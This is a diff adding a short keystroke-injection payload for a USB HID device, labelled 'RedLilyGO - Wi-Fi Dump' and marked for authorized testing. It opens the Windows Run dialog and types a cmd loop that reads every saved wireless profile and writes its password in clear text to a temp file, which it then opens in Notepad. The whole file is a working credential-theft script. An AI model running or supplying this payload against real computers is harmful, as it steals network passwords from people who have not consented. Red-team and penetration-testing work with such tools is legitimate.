@@ -1,0 +1,9 @@
+REM RedLilyGO - Wi-Fi Dump (Windows HID). Needs an Admin session; writes %TEMP%\wifi.txt. Authorized testing only.
+DELAY 1500
+GUI r
+DELAY 1000
+STRING cmd /c (for /f "skip=9 tokens=1,2 delims=:" %i in ('
+STRING netsh wlan show profiles') do @netsh wlan show profi
+STRING le name="%j" key=clear) > "%TEMP%\wifi.txt" & notepa
+STRING d "%TEMP%\wifi.txt"
+ENTER
